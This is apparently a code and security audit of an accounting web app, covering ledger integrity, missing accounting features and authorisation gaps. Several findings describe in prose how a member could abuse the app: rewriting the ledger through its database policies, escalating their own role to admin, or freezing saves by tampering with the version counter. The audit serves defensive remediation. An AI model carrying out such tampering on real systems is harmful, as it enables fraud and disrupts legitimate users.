findings.evidence: There is one test file (src/lib/engine.test.ts, 17 it-blocks plus template loops, 33 tests), all happy paths for engine and templates. There are no tests for store.ts (sync, conflict, sign-out), the RLS policies (no pgTAP, no supabase/tests), non-admin denial across every action (post, void, pay, delete, import, approvals), or UI journeys. tsconfig.app.json excludes `src/**/*.test.ts` from typecheck and does not set `strict` explicitly. Runtime data is trusted through casts (`as Workspace`, `!` non-null assertions throughout RecordPage.tsx and engine.ts). No .github workflows exist, so tsc, lint and tests aren't enforced on PRs.
findings.impact: Each of the critical issues above would have been caught by a 20-line RLS test or a two-browser e2e test. Regressions will ship unnoticed.
findings.recommendation: Add GitHub Actions running `tsc -b`, `oxlint`, `vitest --coverage` (gate at 80% for src/lib) and a `supabase start` job running pgTAP policy tests. The pgTAP suite should cover non-member reads, member-to-admin escalation (SECU-02), anon access and created_by tampering. Add Playwright journeys for register → onboard → publish → sales creates quote → finance posts → pays → void, plus a two-browser concurrency test. Set `strict: true` explicitly, and validate the doc with zod at load.
findings.auditor: There is one test file, and 33 tests pass (vitest run). There are no store, RLS or e-2-e tests and no .github directory. Correction: tsconfig.app.json does not just leave strict implicit; it has no strict key at all, so strict and strictNullChecks are OFF. Every `?.`, `!` and undefined path in engine and store is unchecked by the compiler. That is worse than the panel said.

findings.title: Some engine actions skip permission checks, and notification read-state is shared across users
findings.evidence: quoteToInvoice (engine.ts:557-565) never checks 'edit' on the quote, which it mutates to 'invoiced' (562). convertLead (329-348) changes the lead's stage without need(ctx, lead.module, 'edit'). addComment (765) and requestApproval (734) don't check 'view' on the record. Shell.tsx:77 sets `n.read = true` on shared role notes, so one user opening the bell marks them read for everyone in that role.
findings.impact: Small authorisation gaps, which matter once the engine becomes the server API. Notifications get missed.
findings.recommendation: Add need() calls in all four functions and a unit test matrix: role × action → allowed/denied. Store read-state per user (notes_read(user_id, note_id)).
findings.auditor: Partly overstated. quoteToInvoice calls createRecord without silent (engine.ts:561), so 'create' on Invoices is checked; only 'edit' on the quote is missing. convertLead likewise checks 'create' on Customers and Deals through createRecord (338-341) but not 'edit' on the lead. addComment (765) and requestApproval (734) do lack view checks. Shared read-state is confirmed: Shell.tsx:77 sets n.read on notes addressed to a role, for everyone in that role. One more gap: the engine never locks quotes. updateRecord exempts quotes (267), and setLines allows 'sent' (383), so an invoiced quote stays editable outside the UI.

findings.title: Sample users and posted sample journals are seeded into the live workspace
findings.evidence: Builder.tsx:64-68 calls seedSampleData on first publish. seed.ts:30-38 pushes demo users (…@demo.local, demo:true) with real roles into ws.users, and per the tests (engine.test.ts:34) the sample data posts documents into the same ledger. Admins can then switchUser to these identities (Shell.tsx:91) and act as them.
findings.impact: Real and sample transactions mix in the trial balance. Fake identities can approve or post, which muddies the audit trail.
findings.recommendation: Seed into a separate 'Sandbox' workspace, or give the user a prominent 'Clear sample data and go live' step that is required before the first real posting, with posting blocked until it's done. Never let demo users decide approvals.
findings.auditor: The panel understated this. Sample data is on by default (Suggest.tsx:17 useState(true), then 28). seed.ts:30-38 adds demo users with real roles, and seed.ts:156-175 posts bills and invoices and registers payments in the live ledger. Paid documents cannot be voided (engine.ts:512), and no 'clear sample data' feature exists in src. So every company that keeps the default has sample revenue, COGS and cash in its trial balance that it cannot remove. Admins can also switchUser to the demo identities. Raised to medium.

findings.title: .env is committed and .gitignore doesn't cover env files, inviting a future secret leak
findings.evidence: .env (committed in 3ddd3c0) holds the URL and publishable key, which are public by design. .gitignore has only node_modules, dist and *.local. When server functions arrive (SECU-01), the next person adding SUPABASE_SERVICE_ROLE_KEY to .env will commit a key that bypasses RLS.
findings.impact: Leaking the service-role key would be a total breach of every tenant.
findings.recommendation: Rename to .env.example (public values only), add `.env` and `.env.*` (except the example) to .gitignore, enable GitHub secret scanning and push protection, and keep server secrets only in Supabase/Vercel environment settings.
findings.auditor: .env is tracked (git ls-files lists it; it was added in 3ddd3c0) and holds only the URL and publishable key, with a comment saying they are public. .gitignore has only node_modules, dist and *.local. The risk is future misuse with a service-role key. Low is correct.

findings.title: 'Set field' automations silently change posted invoices and bills, skipping the lock, permissions, approvals and audit
findings.evidence: engine.ts:656-661: a set_field action calls cleanValues and assigns rec.values directly. It does not check rec.status (unlike updateRecord at 267), does not call need(), does not update rec.updatedAt (so approvalNeeded at 720 still treats an old approval as valid), and writes no field-history log (only a generic 'ran X' line at 669). postDocument fires runWorkflows(ctx, rec, 'updated') right after posting (505), and date_passed automations run over posted documents too (673-690). On invoices and bills, customer, date and due_date are system fields but not readOnly (roles.ts:229-231, 243-245). validate.ts:278-283 blocks only readOnly targets, so an automation like 'When invoice updated → set Customer/Due date' passes the health check.
findings.impact: A posted tax invoice can move to another customer or get a new date or due date after posting, with no field history and no stock or journal change. AR ageing (engine.ts:876-878), customer statements and printed copies then disagree with the ledger and with what was sent to the customer or ETA. This breaks the product's main 'posted documents are immutable' guardrail.
findings.recommendation: In execute(), skip set_field (and record it in the automation run log as 'skipped: document is posted') when mod.lines and rec.status !== 'draft' (quotes excepted). Run set_field through updateRecord-equivalent logic: bump updatedAt, write a field-history log attributed to 'Automation', and respect approval invalidation. In validate.ts, raise an error for any set_field that targets customer, supplier, date, due_date or lines on an invoices or purchases module. In the Automations tab, grey out those fields with the tooltip 'Locked after posting'.

findings.title: No accounting period lock: finance can post, pay and void into any past or future date, including closed VAT periods
findings.area: engine.ts postDocument / registerPayment / voidDocument; company settings
findings.evidence: postDocument takes `date = rec.values.date` as typed by the user (engine.ts:433), and only checks that due_date is not before it (434). nextNumber derives the sequence year from that date (399-404, 452), so an invoice dated last year draws INV-2025-xxxx in 2026. registerPayment only requires date >= document date (540), so future-dated cash receipts are accepted. voidDocument always reverses on today's date (513). schema.ts, types.ts and engine.ts contain no lock date, period or closed concept (grep for lockDate, period and closed returns nothing).
findings.impact: Figures for VAT returns already filed with the ETA, and for months already closed, can change at any time. Back-dated invoices get numbers in a prior-year series out of chronological order. A future-dated payment makes today's cash balance wrong. Odoo, BC, Zoho Books and QuickBooks all ship a 'lock date' or 'period close' for exactly this reason, and auditors test it.
findings.recommendation: Add company.lockDate (and optionally a separate taxLockDate) to Settings, editable only by the owner and logged. In postDocument, registerPayment and voidDocument, reject dates on or before the lock date with the message 'This period is closed (locked up to 31 Mar 2026). Ask the owner to reopen it.' Allow a maximum of N days future-dating for payments. Number documents by posting sequence within the current fiscal year, not by the typed date. Add a 'Close month' wizard on the Accounting page that sets the lock date after showing the trial balance.

findings.title: Any member can freeze saving for the whole company by setting the version counter, and the server keeps no record of who wrote what
findings.evidence: version is an ordinary integer the client writes (migrations:10; store.ts:58 `version: version + 1`). No trigger enforces NEW.version = OLD.version + 1. A member can PATCH version to 2147483647; after that, every client's `version + 1` overflows the integer, the UPDATE errors, and store.ts:62-66 retries every 5 s forever with 'Not saved, retrying…'. They can also set version backwards so other clients' optimistic checks match stale bases. The workspaces table has no updated_by column, and nothing logs which auth.uid() wrote which save (migrations:6-14, 46-54 only touches updated_at).
findings.impact: One disgruntled member can stop every colleague from saving, and after any tampering (SECU-01) there is no server-side forensic trail of who changed the books or when.
findings.recommendation: BEFORE UPDATE trigger: set NEW.version := OLD.version + 1 (ignore the client value), set NEW.updated_by := auth.uid(), and insert OLD into an append-only workspace_versions table (see SECU-08). Use bigint for version. This is a stopgap until the command-API rework in SECU-01.

findings.title: A person who belongs to several companies can only ever open one, and membership needs no consent
findings.evidence: openFor (store.ts:188-211) loads all of a user's memberships but opens rows.find(LAST_WS) ?? rows[0], the oldest by added_at. LAST_WS is written only by open() (174-185), and no UI anywhere lets the user switch workspace, see the list, or leave one. migrations:77-80 let any workspace admin insert any e-mail address, with no acceptance step, so a stranger's workspace can become the oldest row for a new user who then lands in it on /join.
findings.impact: External accountants and bookkeepers, a very common pattern for Egyptian SMEs, cannot serve multiple clients from one login. A user who is invited to a second company never sees it. An unwanted or spoofed 'company' can be pushed onto someone's account. Odoo, Zoho and QuickBooks all have a company switcher and invitation acceptance.
findings.recommendation: Add a workspace switcher in the Shell header (company name dropdown, 'Create new company'), and a 'Pending invitations: Accept / Decline' screen tied to the invitations table from SECU-09. Store the chosen workspace in LAST_WS on switch, and add 'Leave this workspace' in the profile menu.

findings.title: Any error while loading the workspace silently signs the user out
findings.evidence: init() (store.ts:214-223) wraps getSession + openFor in try/catch, and on any exception calls supabase.auth.signOut(). That includes a network timeout, the 'no profile' error (208), or a malformed doc throwing during cast use. The user is sent to the landing page with no message, because the error text is swallowed (comment: 'a stale or broken session').
findings.impact: A flaky mobile connection or a short Supabase outage at page load throws the user out and makes them re-enter their password. A data problem that should go to support looks like a login bug, which drives support tickets and lowers trust.
findings.recommendation: Sign out only on auth errors (invalid or expired refresh token). For network errors, show a full-screen 'Can't reach Bonyan. Retry' state with automatic back-off. For workspace-data errors, show the specific message with a 'Contact your admin' action instead of signing out.

strengths: Every posting goes through one journal() gate (src/lib/engine.ts:406-412) that rounds each line and rejects any entry that does not balance. Every posted invoice, bill and payment writes a real double-entry journal covering AR, AP, VAT input and output, inventory and COGS (engine.ts:464-497, 545-550).

Gapless numbering is designed correctly within one session. All checks (lines, party, due date, stock, approval) run before nextNumber() is called (engine.ts:450-452), and a test proves a failed post uses no number (engine.test.ts:84-92).

Posted documents are locked in the engine, not only in the UI. updateRecord and deleteRecord refuse non-draft invoices and bills (engine.ts:267, 297), and correction is by a void that writes a mirror reversal journal and reverses stock (engine.ts:508-530).
Payments are guarded: amount > 0, no more than the balance due, not dated before the document. The posted → partial → paid status is derived from the numbers, not typed in (engine.ts:536-553).
Approvals stop counting when the record changes after the decision (engine.ts:720), and self-approval is blocked for non-admins (engine.ts:753). That is better than many SMB tools.
Currency is locked once anything is posted (SettingsTab.tsx:23-26). VAT is stored on each line, so changing the default rate never alters posted invoices.
On-hand quantity and moving-average cost are derived only from posted documents. Product 'cost' and 'stock' are read-only system fields (roles.ts:64, 67), so users cannot type over the valuation.
Each action runs on a copy of the workspace and is committed only if it succeeds (store.ts:97-106, useApp.ts:34-43), so a failed post never half-writes the books.
AR/AP ageing in the standard buckets (engine.ts:868-885) and a seeded 'collect overdue invoices' automation (packs.ts:72) fit the Egyptian 'late collections' problem well.

scorecard.rationale: From a books-integrity view: posting, immutability, numbering and SoD are enforced only in the browser, and any member can rewrite the JSON ledger through RLS (ACCO-01). Save conflicts drop postings (ACCO-02), the audit log is capped at 500 rows and impersonation falsifies who did what (ACCO-14).

The core double entry is correctly shaped (AR/AP/VAT/inventory/COGS, balanced-entry gate, void by reversal, guarded payments). Against IFRS/EAS, ETA and ERP practice it lacks a configurable chart of accounts, equity, opening balances, financial statements, period close, credit notes, WHT, tax codes and VAT return, multi-currency, bank reconciliation and ETA submission. Inventory GL also drifts from the stock subledger in five reproducible flows.

The happy path works end to end (quote → invoice → post → partial or full payment; bill → stock → payment; void of an unpaid document). Exception paths that real finance teams hit daily (returns, refunds, bounced cheques, corrections to paid invoices, advances, multi-invoice receipts, stock write-offs, month end) have no workflow, and the tests do not verify subledger-to-GL consistency.

Posting logic is sequenced sensibly: numbers are taken only after all checks, approvals expire when the record changes, currency locks after the first posting. But setup skips the steps an accountant expects (chart of accounts, tax codes, opening balances, fiscal periods, banks). fiscalYearStart is collected and then ignored, and automations can mutate posted documents.

There are ageing buckets and a few KPIs, but no P&L, balance sheet, cash-flow statement, GL drill-down or statements of account. Dashboard revenue includes VAT and is bucketed by creation date, and 'Gross profit' subtracts operating expenses.

For finance, Bonyan today trails Odoo Accounting, Zoho Books, QuickBooks and local ETA-integrated ERPs on almost every dimension that decides an Egyptian SME purchase (ETA compliance, WHT, cheques, statements, multi-currency, financial statements). Its differentiator, guided, guardrailed setup, does not yet reach the ledger.

Field and module flexibility is protected by good guardrails for CRM data. For finance the balance is off in both directions: users cannot extend the chart of accounts, tax codes or document types at all, yet an automation can rewrite a posted tax invoice and track_stock can be toggled after stock exists.

There is automation for overdue collections and reorder alerts, but no finance diagnostics: no reconciliation checks, anomaly detection or 'why don't my numbers match' assistant. The Books-balance banner is structurally always green.

vision: Best-in-class SME finance for Bonyan looks like this: the owner never sees debits and credits unless they want to, but every click lands in a server-enforced, append-only ledger that an auditor or the ETA would accept as is. Onboarding adds a 10-minute 'Finance setup' step. It seeds an Egyptian chart of accounts aligned with IFRS for the chosen industry, tax codes (14% standard, zero-rated, exempt, Table tax, WHT 1/3/5%), banks and InstaPay or cheque accounts, fiscal year and lock dates, and ETA credentials with token signing. It then runs an opening-balance wizard that imports open invoices, stock counts and bank balances and proves they tie out. Every invoice validates against ETA rules before Post, submits automatically, and shows its ETA status, UUID and QR on a bilingual RTL print. Corrections flow through credit and debit notes, payment reversals and a cheque register, never through hacks. Receipts are allocated across many invoices, advances are held as liabilities, and bank statement lines are matched with suggestions. Stock is valued as a perpetual value ledger, so inventory on the balance sheet always equals the stock report, and landed costs and write-offs are one-screen documents. Month end is a checklist: reconcile banks, review the 'Books health' card (AR, AP and inventory subledgers vs GL, negative stock, unapplied cash, VAT reconciliation), post the VAT and WHT returns, revalue FX, then lock the period. Owners get a live P&L, balance sheet, cash-flow and 13-week cash forecast with drill-down to any document, plus per-customer credit exposure that blocks risky invoices before they are posted. An AI assistant on top explains anomalies in plain Arabic or English ('Inventory is EGP 3,200 above stock value because product X was switched to non-tracked on 12 May — create an adjustment?') and fixes them with one approved click, which is something Odoo, Zoho and QuickBooks do not do for an Egyptian SME today.

findings.title: The books are client-authoritative: any member can rewrite journals, sequences and posted invoices
findings.evidence: supabase/migrations/20261024000000_workspaces.sql:67-70 lets any member UPDATE workspaces.doc with only an is_member() check. store.ts:55-60 writes the whole Workspace JSON, including data.journal, data.sequences, data.payments, data.stock and users[].roleId. Every rule (canPost engine.ts:35-38, the posted-document lock engine.ts:267, gapless nextNumber engine.ts:399-404) runs in the browser. README 'What comes next' admits this. A Sales user with the publishable key and their JWT can PATCH the row: delete journal lines, reset INV sequences, flip status to 'paid', or set their own roleId to role_admin.
findings.impact: Immutability, gapless numbering, segregation of duties and the balancing check are promises the server never enforces. An auditor, the ETA, or a bank lending against the receivables cannot rely on these books. Internal fraud (erasing a receivable, inventing a payment) leaves no trace.
findings.recommendation: Move posting to the server before any paying customer goes live. Split the ledger out of the JSON doc into append-only Postgres tables (journal_entries, journal_lines, stock_moves, payments, doc_sequences) with RLS that allows INSERT only through SECURITY DEFINER RPCs (post_document, void_document, register_payment). Those RPCs re-run the engine checks, take the number from doc_sequences with SELECT … FOR UPDATE, and refuse UPDATE/DELETE outright, enforced by a trigger. Keep the JSON doc for schema and drafts only. For the user nothing changes: Post still takes one click, but the number now comes from the server.
findings.auditor: The migration at supabase/migrations/20261024000000_workspaces.sql:67-70 allows UPDATE of the whole doc for any member. The admin check private.is_ws_admin is used only on workspace_members (lines 88-95), never on workspaces. store.ts:56-60 writes the full Workspace, so data.journal, data.sequences, data.payments, data.stock and users[].roleId can all be changed. The admin gate itself is client-side (switchUser store.ts:268, canPost engine.ts:35-38). The README (lines 89 and 93) admits this. The SELECT policy (line 59-61) also hands every member, Sales included, the full ledger to download. Severity and XL effort are right.

findings.title: A save conflict silently discards posted invoices and payments, so two different tax invoices can share one number
findings.area: Cloud sync / document numbering (store.ts, engine.ts nextNumber)
findings.evidence: nextNumber (engine.ts:399-404) increments ws.data.sequences locally. flush() (store.ts:55-71) saves with .eq('version', version). If someone else saved first, it calls reload(), which replaces the local workspace (store.ts:140-148) and drops the local post. The only signal is a small 'Reloaded latest' pill (Shell.tsx:87-88). The 'Posted. Stock and accounts are updated.' toast has already shown (RecordPage.tsx:80), and Print is available straight away.
findings.impact: User A posts INV-2026-0005 and prints or sends it to the customer. User B posts a different invoice that also takes INV-2026-0005 and saves first. A's posting disappears without warning, and the books now hold B's invoice under the number A's customer is holding. The result is a duplicate tax-invoice number, missing revenue, VAT output and stock relief, and a payment the customer made with no matching record.
findings.recommendation: Short term (S): on conflict, keep a log of the engine commands applied since the last save, then reload and replay them. Re-numbering happens on replay, and if a replay throws, show a blocking dialog ('Your invoice INV-… could not be saved because…'). Disable Print and Send until the post is confirmed saved. Long term: server-side numbering as in ACCO-01.
findings.auditor: This is worse than the panel says. There is no realtime subscription, polling or refresh-on-focus anywhere in src (grep for channel, subscribe, setInterval and visibilitychange finds nothing). So once another member saves, a client's local copy is stale, and its next flush is guaranteed to hit the .eq('version') miss (store.ts:68-72). reload() then sets dirty=false and overwrites the local workspace (store.ts:141-148). This is not a rare race: it happens every time two people work at once. Their sequences were computed from stale data (engine.ts:399-404), so duplicate numbers are likely. The success toast (RecordPage.tsx:80) and Print (RecordPage.tsx:88) are both available before the save is confirmed. The only signal is the amber pill at Shell.tsx:87-88.

findings.title: The inventory GL account (1300) drifts away from the stock subledger in common flows
findings.evidence:
Reproduced with a scratch vitest against the real engine (all 33 repo tests still pass):
(A) Void a sales invoice after a newer purchase. voidDocument re-enters stock at the original cost (engine.ts:521) but never re-averages p.values.cost. Result: qty 20 × avg 20 = 400 in the stock subledger, but GL 1300 = 300.
(B) Void a purchase bill after 8 of its 10 units were sold. The void runs no stock check (engine.ts:514-523). Result: on-hand -8 and GL 1300 = -80, even though allowNegativeStock is false.
(D) With negative stock allowed, sell 5 units before any purchase. COGS is posted at cost 0 (engine.ts:458), and the later bill sets cost = unitCost (engine.ts:483). Result: qty 0, GL inventory 200, COGS 0, so gross profit is overstated by 200.
(E) track_stock is an editable checkbox (roles.ts:66). After it is turned off, a sale of 10 units books COGS 0 and the 10 units / EGP 100 stay in inventory forever.
(C) Average cost is rounded to 2 decimals (engine.ts:483) and unit cost is rounded too (engine.ts:484). Result: qty 0 with GL 1300 = -0.03 and an avg cost of 5.16 still showing.
Inventory.tsx:13 values stock as onHand × cost, so its 'Stock value' KPI disagrees with the trial balance.
findings.impact: The balance sheet shows inventory and COGS that do not match the physical stock: wrong gross margin, wrong taxable profit, and a failed IAS 2 / EAS 2 inventory audit. Owners in distribution and pharma (the target templates) will see margin reports they cannot trust.
findings.recommendation: Hold a perpetual valuation per product as (qty, total value), not a rounded unit cost. Average cost = value / qty, kept to 4-6 decimals, and the issue that empties stock takes the exact remaining value. Sales returns and voids re-enter at the original COGS and re-average. Block a purchase-bill void when it would drive stock negative; require a purchase return of the remaining quantity instead. Lock track_stock once a product has movements (validator plus engine). When stock is negative, post the price difference on receipt to COGS (Odoo- and SAP-style). Add a 'Books health' invariant (GL 1300 = Σ product value) to the engine and the tests.
findings.auditor: I reproduced every case against the real engine with a scratch script. (A) qty 20, avg 20, subledger 400, GL1300 300. (B) qty -8, GL1300 -80: the purchase void at engine.ts:514-523 runs no stock check. (D) qty 0, GL1300 200, COGS 0. (E) qty 10 with GL 100 and COGS 0; the product also disappears from Inventory, which filters on track_stock (Inventory.tsx:11). (C) a residual of -0.01 with avg 5.16. One citation is wrong: track_stock is a sys() editable checkbox at roles.ts:215, not roles.ts:66, which is the ROLES description table.

findings.title: Automations can change posted tax invoices (customer, dates) and bypass the posted lock
findings.evidence: postDocument fires runWorkflows(ctx, rec, 'updated') right after posting (engine.ts:505). The set_field action calls cleanValues directly (engine.ts:656-661) and never checks status, unlike updateRecord (engine.ts:267). cleanValues skips only readOnly fields, and customer, date and due_date are system fields but not readOnly (roles.ts:80-82). validate.ts:278-282 only warns for 'updated' triggers. The scheduled date_passed path (engine.ts:673-689) also calls execute(), for example on overdue invoices. Scratch probe: an 'updated' automation setting customer=C2 changed the customer of a posted invoice while its status stayed 'posted'.
findings.impact: An issued tax invoice can quietly change buyer or dates after posting, which violates the immutability the README promises and ETA rules. AR ageing then attributes the debt to the wrong customer.
findings.recommendation: In execute(), skip and log set_field when mod.lines is set and rec.status is not draft. In validate.ts, raise an error (not a warning) for set_field targeting any system field of an invoices or purchases module. In the Automations builder, list only fields that are safe on posted documents (for example custom tags or 'collection status').
findings.auditor: Mechanically true. postDocument calls runWorkflows 'updated' (engine.ts:505), and set_field calls cleanValues with no status check (engine.ts:656-661). My probe changed the customer of a posted invoice while it stayed 'posted'. The journal and stock rows keep the old date and party, so the document and the GL disagree. But it needs an admin to configure a set_field automation on a system field with a static value (for a relation, a record id), and validate.ts:282 already warns. This is admin misconfiguration, not a user-level bypass, so critical is overstated. Citation: the system fields are at roles.ts:229-231, not 80-82. The S fix in execute() and validate.ts is still worth doing.

findings.title: No credit notes, returns or payment reversal: a paid or part-paid document can never be corrected
findings.evidence: voidDocument refuses any document with paid > 0 and says 'Refund or reverse them before voiding' (engine.ts:512), but no function exists to reverse or refund a payment. data.payments is only ever unshifted (engine.ts:543). The UI shows Void only when status === 'posted' (RecordPage.tsx:85). DocStatus has no credit-note concept (types.ts:4), and the only document roles are quotes, invoices and purchases. README lists credit notes as future work.
findings.impact: Everyday situations have no compliant path: a customer returns 2 of 10 boxes, a price was wrong on a paid invoice, a cheque bounces, a supplier gives a rebate. Users will either post fake invoices or leave the books wrong. ETA requires a credit or debit note referencing the original UUID after the cancellation window, so 'void' alone is not compliant for submitted invoices.
findings.recommendation: Add Credit note and Debit note document roles (CN-/DN- sequences), created from an invoice or bill with a 'Create credit note' button. They allow partial quantities and prices, return stock at the original COGS, reverse VAT, and post Dr Revenue / Dr VAT output / Cr AR (mirrored for AP). Let a credit be applied to open invoices or refunded. Add reversePayment(paymentId, reason) for bounced cheques and refunds, with its own journal. Keep the 'void' path only for unsubmitted or same-day documents.
findings.auditor: voidDocument refuses when paid > 0 (engine.ts:512). No function reverses, deletes or refunds a payment; data.payments is only unshifted (engine.ts:543). There are no manual journals either (ACCO-07), so a mis-keyed payment, which happens daily, leaves AR and cash wrong with no remedy at all. That justifies critical. Void shows only for status 'posted' (RecordPage.tsx:85), so partial documents are stuck too. DocStatus (types.ts:4) has no credit or debit note. Ship reversePayment first (S-M) and credit and debit notes after it (L).

findings.title: No fiscal periods, lock dates or year-end close; any posting date is accepted
findings.evidence: company.fiscalYearStart is stored and editable (schema.ts:197, SettingsTab.tsx:29-33) but used nowhere in the engine. Sequences are keyed by the calendar year of the document date (engine.ts:400). postDocument accepts any date (engine.ts:433): the scratch probe posted INV-2019-0001 and INV-2030-0001 into a 2026 workspace. Stock checks and moving-average cost use posting order, not document date (engine.ts:446, 480-483), so a back-dated sale can consume stock bought later. Void reversals always use today (engine.ts:513).
findings.impact: Filed VAT returns (monthly) and audited annual statements can be changed after the fact. Numbering by calendar year conflicts with a July-June fiscal year. Future-dated invoices inflate the current receivables. Competitors (Odoo lock dates, QuickBooks closing date, SAP posting periods, NetSuite period close) all prevent this.
findings.recommendation: Add a Periods screen under Accounting: open, soft-locked (finance only) and hard-locked periods, plus an 'Accountant lock date' and an 'All users lock date'. postDocument, voidDocument and registerPayment refuse dates in locked periods or more than N days in the future, and voids of locked-period documents post on the first open date. Make the sequence key the fiscal year (prefix-FY2026). Add a year-end close that moves P&L to Retained earnings. The validator warns when the last month is not closed 15 days after month end.
findings.auditor: fiscalYearStart is referenced only in SettingsTab.tsx:30, recommend.ts:171 and schema.ts:197; the engine never reads it. My probe posted INV-2019-0001 and INV-2030-0001. A sale dated 2026-01-01 consumed stock from a bill dated 2026-06-01, because onHand ignores dates (engine.ts:419-421, 446). Void reversals use todayISO (engine.ts:513). M effort is optimistic for periods, lock dates and a year-end close together with a COA that has no equity account (ACCO-07); L is more realistic.

findings.title: The chart of accounts is a hard-coded 9-account list with no equity, expenses, banks, manual journals or opening balances
findings.evidence: AccountCode is a TypeScript union of 9 codes (types.ts:43-55). Account types are only asset, liability, income and expense, with no equity, so no capital, retained earnings, loans or fixed assets. Every non-stock purchase goes to one account, 5100 'Purchased services & expenses' (engine.ts:493). No API exists for a manual journal, an opening balance or a stock adjustment, and Inventory.tsx:25 tells users 'To correct stock, post a bill or invoice — never type it in'. One cash account 1100 serves every payment method (engine.ts:544).
findings.impact: A company moving off Excel or another ERP cannot load its opening AR, AP, stock or bank balances. It cannot record rent, salaries, VAT paid to the ETA, owner capital, depreciation or bank charges, cannot write off expired stock (the pharma template), and cannot produce a balance sheet that balances against equity. This is the biggest functional gap against Odoo, Zoho Books and QuickBooks.
findings.recommendation: Make the chart of accounts data, not a type. Each template seeds an IFRS / Egyptian-standards-aligned chart: classes 1-5, sub-types current/non-current, equity, cash vs bank, and contra accounts. Admins can add sub-accounts but cannot delete system-mapped ones (the same guardrail philosophy as system fields). Add account mapping on product categories and expense categories. Add a Manual journal document (JV-) with an approval rule. Add an opening-balance wizard: import open invoices and bills per party, a stock count with unit cost, and bank balances, with the difference going to Opening balance equity. Add stock adjustment and write-off documents (ADJ-) that post to an inventory-loss account.
findings.auditor: AccountCode is a 9-member union, and CHART types are asset, liability, income and expense with no equity (types.ts:43-55). All non-stock bill lines go to 5100 (engine.ts:493). All payment methods post to 1100 (engine.ts:544). There is no manual journal or opening-balance API, and Inventory.tsx:25 explicitly forbids stock correction. importRows (engine.ts:785-807) creates draft records without lines, so open AR and AP cannot be imported either. No opening balances means no real company can migrate, so this is high bordering on launch-blocking.

findings.title: No P&L, balance sheet or cash-flow statement; Accounting KPIs mislabel expenses as cost of sales
findings.evidence: trialBalance(ws) (engine.ts:569-580) has no date range or opening/closing split, so it covers all time. Accounting.tsx:22-23 computes 'Gross profit' as revenue minus (5000 + 5100), which puts operating expenses inside gross margin. The 'Revenue' KPI is lifetime. The Journal tab shows only the latest 60 entries (Accounting.tsx:82) with no search, filter, account drill-down or export. 'Books do not balance … Contact support' (Accounting.tsx:36) cannot actually trigger, because journal() rejects unbalanced entries.
findings.impact: The owner cannot answer 'did I make money last month?' or produce statements for the bank, tax return or auditor. Gross margin is understated whenever services or expenses are booked through bills.
findings.recommendation: Build a Reports area: P&L (monthly columns, vs prior period, gross margin computed from COGS only), balance sheet as at a date, a cash-flow statement (indirect method from the GL, direct method from payments), general ledger by account with drill-down to the document, and AR/AP subledger statements. All take a date range and period presets and export to Excel and PDF. Rename the KPI and use only COGS for gross profit.
findings.auditor: trialBalance takes no date range (engine.ts:569-580). Gross profit is revenue minus (5000 + 5100) (Accounting.tsx:23). The journal shows the latest 60 entries with no filter (Accounting.tsx:82). On the red banner, journal() makes it unreachable in normal use (engine.ts:410). It could only show for a doc tampered with directly (ACCO-01), and even then 'Contact support' is no diagnosis.

findings.title: Dashboard revenue includes VAT and is grouped by record creation date, not invoice date
findings.evidence: packs.ts:41 'Invoiced revenue' sums 'total' (VAT-inclusive), and packs.ts:48 'Sales by month' also sums 'total'. Grouping uses '__month', which pseudoValue maps to rec.createdAt (engine.ts:593), so a back-dated invoice, an imported invoice or the seeded sample data (seed.ts:186-191) lands in the wrong month. Revenue on the Accounting page is net (GL 4000), so the two screens disagree by 14%.
findings.impact: Owners see revenue inflated by VAT (IFRS 15 / EAS 48 exclude amounts collected on behalf of the state), monthly trends shifted, and two different 'revenue' numbers in the same product. That destroys trust in the dashboards, the product's main selling point.
findings.recommendation: Seed revenue reports with measure 'subtotal'. For document modules, make __month use values.date (and for posted documents, the posting date). Label VAT-inclusive measures explicitly ('Billed incl. VAT'). Better still, add a 'Ledger' report source so finance KPIs come from the GL by period and match the statements exactly.
findings.auditor: Confirmed: 'Invoiced revenue' and 'Sales by month' sum the VAT-inclusive 'total' (packs.ts:41, 48), and __month maps to createdAt (engine.ts:593), so an invoice keyed in late for last month lands in this month. Refuted: the sample data does not land in the wrong month. seed.ts backdate() sets createdAt to the document date (seed.ts:155, 171, 190-194) precisely to avoid this. Imported invoices cannot be posted documents anyway (they import as drafts, which the report excludes). Void documents are correctly excluded (reports.ts:35). This is a default-report measure and grouping problem with an S fix, so high is overstated. The 14% gap against Accounting's net revenue is real.

findings.title: The ETA e-invoice / e-receipt data model is mostly missing; the README overstates readiness
findings.area: Egypt compliance (roles.ts, types.ts Line, schema.ts company, RecordPage PrintView)
findings.evidence: Invoice system fields are only customer, date and due_date plus totals (roles.ts:78-84). Line has only product, description, qty, price, discount and vat (types.ts:6-14): no item code (EGS/GS1), unit type code, tax type/sub-type, or discount amount. The Customers system fields have no tax ID, receiver type (B/P/F), national ID or structured address (roles.ts:27-33); tax_id exists only in the Core template (templates.ts:36).
